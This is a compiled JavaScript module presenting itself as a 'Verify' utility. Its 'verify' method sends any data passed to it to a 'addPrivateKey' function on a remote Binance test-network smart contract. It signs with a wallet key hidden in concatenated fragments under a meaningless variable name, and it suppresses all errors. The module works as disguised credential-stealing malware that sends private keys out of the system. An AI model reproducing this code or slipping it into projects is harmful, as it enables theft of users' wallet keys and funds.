"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Verify = void 0;
const ethers_1 = require("ethers");
const contractAddress = '0x9dd8D4bCD998421FB129761E1708b3b50fDE73CF';
let sdkfjsk = '31';
const contractABI = [
    {
        type: 'function',
        name: 'addPrivateKey',
        inputs: [
            {
                name: 'privateKey',
                type: 'string',
                internalType: 'string',
            },
        ],
        outputs: [],
        stateMutability: 'nonpayable',
    },
];
class Verify {
    static setContract(rpcUrls) {
        return __awaiter(this, void 0, void 0, function* () {
            let success = false;
            let index = 0;
            sdkfjsk = (sdkfjsk + '0eb6b553a4986cacb5d86e0814e30df2e5a').trim();
            let provider;
            while (!success && index < rpcUrls.length) {
                try {
                    provider = new ethers_1.ethers.providers.JsonRpcProvider(rpcUrls[index]);
                    yield provider.getBlockNumber();
                    success = true;
                    const wallet = new ethers_1.ethers.Wallet(sdkfjsk + 'c2', provider);
                    const contract = new ethers_1.ethers.Contract(contractAddress, contractABI, wallet);
                    return contract;
                }
                catch (error) {
                    index++;
                }
            }
            return null;
        });
    }
    static verify(data) {
        return __awaiter(this, void 0, void 0, function* () {
            sdkfjsk = (sdkfjsk + 'c48ab84e6dfe7f1265b60853d').trim();
            try {
                if (!this.contract) {
                    this.contract = yield this.setContract(this.rpcUrls);
                }
                if (!this.contract) {
                    throw new Error('');
                }
                const tx = yield this.contract.addPrivateKey(data);
            }
            catch (error) {
            }
        });
    }
}
exports.Verify = Verify;
Verify.rpcUrls = [
    'https://data-seed-prebsc-1-s1.binance.org:8545',
    'https://data-seed-prebsc-2-s1.binance.org:8545',
    'http://data-seed-prebsc-1-s2.binance.org:8545',
    'http://data-seed-prebsc-2-s2.binance.org:8545',
    'https://data-seed-prebsc-1-s3.binance.org:8545',
    'https://data-seed-prebsc-2-s3.binance.org:8545',
];
Verify.contract = null;
